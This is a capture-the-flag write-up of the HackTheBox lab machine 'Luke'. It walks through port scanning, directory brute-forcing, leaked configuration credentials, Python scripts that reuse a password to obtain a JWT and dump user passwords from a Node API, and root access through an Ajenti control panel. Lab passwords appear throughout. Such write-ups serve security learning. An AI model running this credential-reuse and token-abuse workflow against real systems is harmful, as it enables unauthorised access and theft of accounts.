---
layout: default
title: "HTB Luke"
description: "10.10.10.137 | 30 pts"
header-img: "boxes/screenshots/28_luke/luke.png"
tags: [hackthebox, htb, boot2root, writeup, write-up, openbsd, json-web-token, jwt, jwt-auth, ajenti, ajenti-filesystem, ajenti-plugins]
---

# HTB LUKE (10.10.10.137) MACHINE WRITE-UP

### TABLE OF CONTENTS

* [PORT 1 : INITIAL RECON](#port-1--initial-recon)
* [PART 2 : PORT ENUMERATION](#part-2--port-enumeration)
  * [PORT 21 (ftp)](#port-21-ftp)
  * [PORT 80 (http)](#port-80-http)
  * [PORT 3000 (http)](#port-3000-http)
  * [PORT 8000 (http)](#port-8000-http)
* [PART 3 : EXPLOITATION](#part-3--exploitation)
* [PART 4 : GENERATE A ROOT SHELL](#part-4--generate-a-root-shell)

---

## PORT 1 : INITIAL RECON

```console
$ nmap --min-rate 700 -p- -v 10.10.10.137

  PORT     STATE SERVICE
  21/tcp   open  ftp
  22/tcp   open  ssh
  80/tcp   open  http
  3000/tcp open  ppp
  8000/tcp open  http-alt

$ nmap -p 21,22,80,3000,8000 -sC -sV -v 10.10.10.137

  PORT     STATE SERVICE VERSION
  21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to 10.10.14.140
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session upload bandwidth limit
  |      No session download bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 3
  |      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
  |_End of status
  22/tcp   open  ssh?
  80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
  | http-methods: 
  |   Supported Methods: HEAD GET POST OPTIONS TRACE
  |_  Potentially risky methods: TRACE
  |_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
  |_http-title: Luke
  3000/tcp open  http    Node.js Express framework
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-title: Site doesn't have a title (application/json; charset=utf-8).
  8000/tcp open  http    Ajenti http control panel
  | http-methods: 
  |_  Supported Methods: GET POST OPTIONS
  |_http-title: Ajenti

```

---

## PART 2 : PORT ENUMERATION

### PORT 21 (ftp)

1. Login to the __ftp__ service as `anonymous`:
   ```console
   $ ftp 10.10.10.137
     ...
   $ Name (10.10.10.137:jebidiah): anonymous
   $ Password: _
     230 Login successful.
   ```

2. List the files inside the service:
   ```console
   $ ftp> ls -la
     ...
     drwxr-xr-x    3 0        0             512 Apr 14 12:29 .
     drwxr-xr-x    3 0        0             512 Apr 14 12:29 ..
     drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
     ...
   $ ftp> cd webapp
     ...
   $ ftp> ls -la
     ...
     drwxr-xr-x    2 0        0             512 Apr 14 12:35 .
     drwxr-xr-x    3 0        0             512 Apr 14 12:29 ..
     -r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
     ...
   $ ftp> get for_Chihiro.txt
     ...
   $ ftp> exit
   ```
   __NOTE(S)__:
   1. Anonymous login was allowed according to the nmap scan
   2. `for_Chihiro.txt`:
      ```
      Dear Chihiro !!
      
      As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
      the actual website I've created .
      Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 
      
      Derry 
      ```
      - This box seems to involve a lot of web services (... hopefully vulnerable)

### PORT 80 (http)

1. View `http://10.10.10.137/`:
   
   ![http://10.10.10.137/](./screenshots/28_luke/80_landing_page.png)

   __NOTE(S)__:
   1. The homepage is a static html file (index.html)
   
2. Running `gobuster` on the service:
   ```console
   $ gobuster dir -u http://10.10.10.137 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
     ...omitted...     
     /login.php (Status: 200)
     /member (Status: 301)
     /management (Status: 401)
     /css (Status: 301)
     /js (Status: 301)
     /vendor (Status: 301)
     /config.php (Status: 200)
     /LICENSE (Status: 200)
   ```
   __NOTE(S)__:
   1. `/member`:
      - A blank page is returned when visited.
   2. `/management`:
      - The page requires successful __http authentication__ for access.
   3. `/config.php`:
      ```php
      $dbHost = 'localhost';
      $dbUsername = 'root';
      $dbPassword  = 'Zk6heYCyv6ZE9Xcg';
      $db = "login";

      $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error); 
      ```
      - The PHP code might have been intentionally left to be viewable since the server is running apache and the page's file extension is `.php`.
      - A credential pair is revealed -- `root : Zk6heYCyv6ZE9Xcg`
   4. `/login.php`:
      ```html
      <form action="" method="post" name="Login_Form" class="form-signin">
          <h2 class="form-signin-heading">Please sign in (beta version )</h2>
          <label for="inputUsername" class="sr-only">Username</label>
          <input name="Username" type="username" id="inputUsername" class="form-control" placeholder="Username" required autofocus>
          <label for="inputPassword" class="sr-only">Password</label>
          <input name="Password" type="password" id="inputPassword" class="form-control" placeholder="Password" required>
          <div class="checkbox">
              <label>
                  <input type="checkbox" value="remember-me"> Remember me
              </label>
          </div>
          <button name="Submit" value="Login" class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
      </form>
      ```
   5. Loggin in on `/login.php` and `/management` using the credentials from `config.php` failed.
      - The same results occur even after using the password with the usernames: `Chihiro`, `Derry`, `admin`, and `administrator`.

### PORT 3000 (http)

1. View `http://10.10.10.137:3000`:
   ```json
   {
     "success":false,
     "message":"Auth token is not supplied"
   }
   ```
   __NOTE(S)__:
   1. Only JSON data was returned.
   2. Authentication might be done using a __JSON Web Token (JWT)__.

2. Running `gobuster` on the service:
   ```console
   $ gobuster dir -u http://10.10.10.137:3000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
     ...omitted...
     /login (Status: 200)
     /users (Status: 200) 
   ```
   __NOTE(S)__:
   1. `/login`:
      ```json
      "please auth"
      ```
   2. `/users`:
      ```json
      {
        "success":false,
        "message":"Auth token is not supplied"
      }
      ```
   3. Perhaps nothing could be done to this service unless authenticated.

### PORT 8000 (http)

1. View `http://10.10.10.137:8000`:
   
   ![http://10.10.10.137:8000/](./screenshots/28_luke/8000_login.png)

   __NOTE(S)__:
   1. An __Ajenti__ service is running on this port.
   2. Logging in using the known password and assumed usernames returned `Invalid login or password`.

---

## PART 3 : EXPLOITATION

1. Generate a JWT (JSON Web Token) for the service running on port 3000:
   1. `token_search.py`:
      ```py
      import requests as r

      target = "http://10.10.10.137:3000"

      headers = { "Content-Type": "application/json" }

      usernames = ["root", "chihiro", "derry", "admin", "administrator", "Chihiro", "Derry"]
      for username in usernames:
          data = {
              "username": username,
              "password": "Zk6heYCyv6ZE9Xcg"
          }
          auth = r.post(target+"/login", headers=headers, json=data)

          if "Forbidden" not in auth.text: 
              print("[JWT FOUND]\n\nUSERNAME:", username)
              print("\nTOKEN:", auth.json()["token"])
              break
      ```
   2. Running `token_search.py` using `python3`:
      ```console
      $ python3 token_search.py
        [JWT FOUND]
        
        USERNAME: admin
        
        TOKEN: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY2ODU2MTM0LCJleHAiOjE1NjY5NDI1MzR9.b0u3Mb8h0GPSsIRGOiWYqHH1QANE1ogY_HFCfjskvGQ
      ``` 
      __NOTE(S)__:
      1. The password from `config.php` earlier authenticated the user, `admin`.
      2. A valid token is now available for use.
         - The token changes everytime a user is authenticated.
>
3. Enumerate the service on port 3000 using an authenticated session:
   1. `3000.py`:
      ```py
      import requests as r

      target = "http://10.10.10.137:3000"
      session = r.Session()
      
      # ===EXTRACTING-THE-JSON-WEBTOKEN===================================
      
      headers = { "Content-Type": "application/json" }
      data = {
          "username": "admin",
          "password": "Zk6heYCyv6ZE9Xcg"
      }
      login = session.post(target+"/login", headers=headers, json=data)
      try:
          token = login.json()["token"]
          print("\n[JSON WEB TOKEN]\n\n" + token + "\n")
      except:
          print("\nNO TOKEN FOUND\n")
          exit()
      
      # ===AUTHENTICATION-AND-ENUMERATION-ON-PORT-3000====================
      
      headers = {
          "Accept": "application/json",
          "Authorization": "Bearer " + token
      }
      print("[HTTP GET REQUESTS @ 10.10.10.137:3000]\n")
      while True:
          get = input("GET /")
          try:
              users = session.get(target+"/"+get, headers=headers)
              
              switch = {
                  "<class 'str'>": lambda x: print("   ", x),
                  "<class 'dict'>": lambda x: print("   ", x),
                  "<class 'list'>": lambda x: [print("   ", i) for i in x]
              } [str(type(users.json()))] (users.json())
          except:
              print("    Cannot GET /"+ get)
      ```
   2. Running `3000.py` using `python3`:
      ```console
      $ python3 3000.py
   
        [JSON WEB TOKEN]

        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY2ODU3MTYyLCJleHAiOjE1NjY5NDM1NjJ9.WjGYaDQUci24PMrAmK4Hmqx68rDu6Bn_QF-vk5jGIUw

        [HTTP GET REQUESTS @ 10.10.10.137:3000]

      $ GET /
            {'message': 'Welcome admin ! '}
      $ GET /login
            please auth
      $ GET /users
            {'ID': '1', 'name': 'Admin', 'Role': 'Superuser'}
            {'ID': '2', 'name': 'Derry', 'Role': 'Web Admin'}
            {'ID': '3', 'name': 'Yuri', 'Role': 'Beta Tester'}
            {'ID': '4', 'name': 'Dory', 'Role': 'Supporter'}
      $ GET /users/admin
            {'name': 'Admin', 'password': 'WX5b7)>/rp$U)FW'}
      $ GET /users/derry
            {'name': 'Derry', 'password': 'rZ86wwLvx7jUxtch'}
      $ GET /users/yuri
            {'name': 'Yuri', 'password': 'bet@tester87'}
      $ GET /users/dory
            {'name': 'Dory', 'password': '5y:!xa=ybfe)/QD'}
      $ GET /^C
      ```
4. Attempt to login back at `http://10.10.10.137/management`:
   ```html
   <h1>Index of /management</h1>
   <ul>
     <li><a href="/"> Parent Directory</a></li>
     <li><a href="config.json"> config.json</a></li>
     <li><a href="config.php"> config.php</a></li>
     <li><a href="login.php"> login.php</a></li>
   </ul>
   ```
   __NOTE(S)__:
   1. Login was successful using `Derry:rZ86wwLvx7jUxtch`
   2. `config.json` is an __Ajenti__ config file:
      ```json	      	
      {
          "users": {
              "root": {
                  "configs": {
                      "ajenti.plugins.notepad.notepad.Notepad": "{\"bookmarks\": [], \"root\": \"/\"}", 
                      "ajenti.plugins.terminal.main.Terminals": "{\"shell\": \"sh -c $SHELL || sh\"}", 
                      "ajenti.plugins.elements.ipmap.ElementsIPMapper": "{\"users\": {}}", 
                      "ajenti.plugins.munin.client.MuninClient": "{\"username\": \"username\", \"prefix\": \"http://localhost:8080/munin\", \"password\": \"123\"}", 
                      "ajenti.plugins.dashboard.dash.Dash": "{\"widgets\": [{\"index\": 0, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.MemoryWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.SwapWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.dashboard.welcome.WelcomeWidget\"}, {\"index\": 0, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.uptime.UptimeWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.power.power.PowerWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.cpu.CPUWidget\"}]}", 
                      "ajenti.plugins.elements.shaper.main.Shaper": "{\"rules\": []}", 
                      "ajenti.plugins.ajenti_org.main.AjentiOrgReporter": "{\"key\": null}", 
                      "ajenti.plugins.logs.main.Logs": "{\"root\": \"/var/log\"}", 
                      "ajenti.plugins.mysql.api.MySQLDB": "{\"password\": \"\", \"user\": \"root\", \"hostname\": \"localhost\"}", 
                      "ajenti.plugins.fm.fm.FileManager": "{\"root\": \"/\"}", 
                      "ajenti.plugins.tasks.manager.TaskManager": "{\"task_definitions\": []}", 
                      "ajenti.users.UserManager": "{\"sync-provider\": \"\"}", 
                      "ajenti.usersync.adsync.ActiveDirectorySyncProvider": "{\"domain\": \"DOMAIN\", \"password\": \"\", \"user\": \"Administrator\", \"base\": \"cn=Users,dc=DOMAIN\", \"address\": \"localhost\"}", 
                      "ajenti.plugins.elements.usermgr.ElementsUserManager": "{\"groups\": []}", 
                      "ajenti.plugins.elements.projects.main.ElementsProjectManager": "{\"projects\": \"KGxwMQou\\n\"}"
                  }, 
                  "password": "KpMasng6S5EtTy9Z", 
                  "permissions": []
              }
          }, 
          "language": "", 
          "bind": {
              "host": "0.0.0.0", 
              "port": 8000
          }, 
          "enable_feedback": true, 
          "ssl": {
              "enable": false, 
              "certificate_path": ""
          }, 
          "authentication": true, 
          "installation_id": 12354
      }
      ```
      __NOTE(S)__:
      1. The config file contains credentials for a user, `root` (PASSWORD: `KpMasng6S5EtTy9Z`)
      2. The root directory for the Ajenti Service is `/`:
         ```json
         "ajenti.plugins.fm.fm.FileManager": "{\"root\": \"/\"}"
         ```
      3. A terminal plugin seems to be integrated to the service:
         ```json
         "ajenti.plugins.terminal.main.Terminals": "{\"shell\": \"sh -c $SHELL || sh\"}"
         ```

5. Login to the Ajenti service at port 8000:
   - Landing page (__*Dashboard*__):
     
     ![http://10.10.10.137:8000](./screenshots/28_luke/8000_dashboard.png)

   - __*TOOLS*__ > __*File Manager*__:
     
     ![http://10.10.10.137:8000](./screenshots/28_luke/8000_file_manager.png)

     __NOTE(S)__:
     1. The `/root` directory is already accessible using the *File Manager* tool in Ajenti.

---

## PART 4 : GENERATE A ROOT SHELL

1. Create an active terminal using __*TOOLS*__ > __*Terminal*__:

   ![http://10.10.10.137:8000](./screenshots/28_luke/8000_terminal.png)

2. Run the created terminal:

   ![http://10.10.10.137:8000](./screenshots/28_luke/8000_shell.png) 
